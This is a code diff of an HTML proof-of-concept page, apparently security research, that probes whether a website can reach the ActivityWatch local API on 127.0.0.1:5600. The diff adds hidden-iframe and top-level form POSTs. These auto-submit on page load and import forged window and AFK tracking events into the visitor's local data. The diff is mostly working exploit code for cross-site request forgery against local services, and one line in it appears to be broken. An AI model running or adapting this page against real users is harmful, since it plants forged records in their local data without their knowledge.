@@ -1,24 +1,44 @@
 <!DOCTYPE html><html><head><meta charset="utf-8"><title>R19 LNA probe</title></head><body>
 <h3>R19 ActivityWatch local-API reachability probe</h3>
 <pre id="log"></pre>
+<iframe name="sink" style="display:none"></iframe>
+<form id="f1" method="POST" action="http://127.0.0.1:5600/api/0/import" target="sink" enctype="multipart/form-data">
+  <input type="file" name="buckets"><input type="submit" value="iframe-import">
+</form>
+<form id="f2" method="POST" action="http://127.0.0.1:5600/api/0/import" enctype="multipart/form-data">
+  <input type="file" name="buckets"><input type="submit" value="top-import">
+</form>
 <script>
 const L=(m)=>{document.getElementById('log').textContent+=m+"\n"};
+function mkfile(host){
+  const now=new Date().toISOString();
+  const payload={"buckets":{
+    "aw-watcher-window_"+host:{"id":"aw-watcher-window_"+host,"type":"currentwindow","client":"aw-watcher-window","hostname":host,"created":now,"data":{},"events":[{"timestamp":now,"duration":1800,"data":{"app":"R19-LNA-PROBE","title":"iframe/form transport"}}]},
+    "aw-watcher-afk_"+host:{"id":"aw-watcher-afk_"+host,"type":"afkstatus","client":"aw-watcher-afk","hostname":host,"created":now,"data":{},"events":[{"timestamp":now,"duration":1800,"data":{"status":"not-afk"}}]}}};
+  return new File([JSON.stringify(payload)],"buckets.json",{type:"application/json"});
+}
 (async()=>{
-  // Probe 1: simple multipart import (the attack shape) - no-cors
+  // Probe A: no-cors fetch (known: blocked on chromium-current)
   try{
-    const payload={"buckets":{
-      "aw-watcher-window_lnaprobe":{"id":"aw-watcher-window_lnaprobe","type":"currentwindow","client":"aw-watcher-window","hostname":"lnaprobe","created":new Date().toISOString(),"data":{},"events":[{"timestamp":new Date().toISOString(),"duration":1800,"data":{"app":"R19-LNA-PROBE","title":"browser-gate test"}}]},
-      "aw-watcher-afk_lnaprobe":{"id":"aw-watcher-afk_lnaprobe","type":"afkstatus","client":"aw-watcher-afk","hostname":"lnaprobe","created":new Date().toISOString(),"data":{},"events":[{"timestamp":new Date().toISOString(),"duration":1800,"data":{"status":"not-afk"}}]}}};
-    const fd=new FormData();
-    fd.append("buckets",new Blob([JSON.stringify(payload)],{type:"application/json"}));
+    const fd=new FormData(); fd.append("buckets",new Blob([JSON.stringify({buckets:{}})],{type:"application/json"}));
     const r=await fetch("http://127.0.0.1:5600/api/0/import",{method:"POST",mode:"no-cors",body:fd});
-    L("IMPORT-FETCH: resolved, status="+r.status+" type="+r.type+" (opaque expected; server-side execution is decided by the server, not this response)");
-  }catch(e){L("IMPORT-FETCH: REJECTED: "+e)}
-  // Probe 2: CORS GET (readability check)
+    L("A fetch: resolved status="+r.status);
+  }catch(e){L("A fetch: REJECTED: "+e)}
+  // Probe B: hidden iframe form POST navigation (frame)
   try{
-    const r2=await fetch("http://127.0.0.1:5600/api/0/info",{mode:"cors"});
-    L("CORS-GET /info: ok status="+r2.status);
-  }catch(e){L("CORS-GET /info: blocked (expected, origin not allowlisted): "+e)}
+    document.querySelector('#f1 input[type=file]').files = await new DataTransfer().items.add ? null : null;
+  }catch(e){}
+  try{
+    const dt=new DataTransfer(); dt.items.add(mkfile("lnaframe"));
+    document.querySelector('#f1 input[type=file]').files=dt.files;
+    document.getElementById('f1').submit();
+    L("B iframe-form: submitted (no exception)");
+  }catch(e){L("B iframe-form: "+e)}
+  // Probe C: top-level form POST navigation, auto after 4s
+  const dt2=new DataTransfer(); dt2.items.add(mkfile("lnatopnav"));
+  document.querySelector('#f2 input[type=file]').files=dt2.files;
+  setTimeout(()=>{document.getElementById('f2').submit();},4000);
+  L("C top-form: armed (4s)");
   L("DONE origin="+location.origin);
 })();
 </script></body></html>
